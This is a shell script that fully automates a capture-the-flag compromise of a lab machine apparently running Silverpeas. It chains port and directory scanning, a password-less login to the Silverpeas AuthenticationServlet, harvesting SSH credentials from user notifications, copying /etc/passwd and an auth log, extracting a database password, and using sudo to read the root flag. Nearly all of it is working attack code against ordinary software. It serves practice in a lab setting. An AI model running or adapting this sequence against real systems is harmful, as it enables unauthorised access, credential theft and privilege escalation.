#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.6.79"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - RECONNAISSANCE"
nmap -p- -Pn -sC -sV -A -sS -T5 ${target_ip} > $result_folder/nmap-results.txt
gobuster dir -u http://$target_ip -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories.txt
gobuster dir -u http://$target_ip/assets -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/assets.txt
gobuster dir -u http://$target_ip/images -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/images.txt
gobuster dir -u http://$target_ip:8080 -t 200 -x php,sh,txt,cgi,jpg,png,html,js,css,py -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -o $result_folder/directories2.txt

echo "2 - SILVERPEAS ANALYSIS"
curl -s -X GET http://$target_ip/#contact -o $result_folder/contact.html
USERNAME=$(cat $result_folder/contact.html | sed -n 's/.*His username is "\(.*\)".*/\1/p')
echo "--> Username is '$USERNAME'"

curl -s -X GET https://www.silverpeas.org/installation/installationV6.html -o $result_folder/silverpeas.html
DIRECTORY=$(cat $result_folder/silverpeas.html | sed -n 's/.*href="http:\/\/localhost:8000\/\(.*\)">.*/\1/p')
echo "--> Directory is '$DIRECTORY'"

curl -s -X GET "http://$target_ip:8080/$DIRECTORY/" -L -c $result_folder/cookies.txt > /dev/null
curl -s -X POST "http://$target_ip:8080/$DIRECTORY/AuthenticationServlet" -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "Login=$USERNAME&DomainId=0" -o $result_folder/temp.html
curl -s -X GET "http://$target_ip:8080/$DIRECTORY/Rdirectory/jsp/Main" -b "$result_folder/cookies.txt" -o $result_folder/users.html
MANAGER=$(cat $result_folder/users.html | sed -n 's/.*userId=2">\(.*\) .*/\1/p' | tail -1)
echo "--> Manager is '$MANAGER'"

curl -s -X GET "http://$target_ip:8080/$DIRECTORY/" -L -c $result_folder/cookies.txt > /dev/null
curl -s -X POST "http://$target_ip:8080/$DIRECTORY/AuthenticationServlet" -b "$result_folder/cookies.txt" -H "Content-Type: application/x-www-form-urlencoded" -d "Login=$MANAGER&DomainId=0" -o $result_folder/temp.html

echo "3 - INTRUSION"
curl -s -X GET "http://$target_ip:8080/$DIRECTORY/services/usernotifications/inbox?page=1;30" -b "$result_folder/cookies.txt" -o $result_folder/notifications.txt
USERNAME=$(cat $result_folder/notifications.txt | sed -n 's/.*<p>Username: \([^<]*\)<\/p>.*/\1/p')
echo "--> SSH username is '$USERNAME'"
PASSWORD=$(cat $result_folder/notifications.txt | sed -n 's/.*<p>Password:&nbsp;\([^<]*\)<\/p>.*/\1/p')
echo "--> SSH password is '$PASSWORD'"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no ${USERNAME}@${target_ip}:user.txt $result_folder/user.txt
USER_FLAG=$(cat $result_folder/user.txt)
echo "--> User flag is '$USER_FLAG'"


echo "4 - PRIVILEGE ESCALATION"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no ${USERNAME}@${target_ip}:/etc/passwd $result_folder/etc-passwd.txt
PRIVILEGED=$(cat $result_folder/etc-passwd.txt | grep 1000:1000 | sed -n 's/\(.*\):x.*/\1/p')
echo "--> Privileged user is '$PRIVILEGED'"
sshpass -p ${PASSWORD} scp -o StrictHostKeyChecking=no $USERNAME@$target_ip:/var/log/auth.log.2 $result_folder/auth.log
DB_PASSWORD=$(cat $result_folder/auth.log | sed -n 's/.*DB_PASSWORD=\([^ ]*\).*/\1/p'  | head -n 1)
echo "--> DB password is '$DB_PASSWORD'"
sshpass -p ${DB_PASSWORD} ssh -o StrictHostKeyChecking=no $PRIVILEGED@${target_ip} "printf '$DB_PASSWORD' | sudo -S cat /root/root.txt" > $result_folder/root.txt
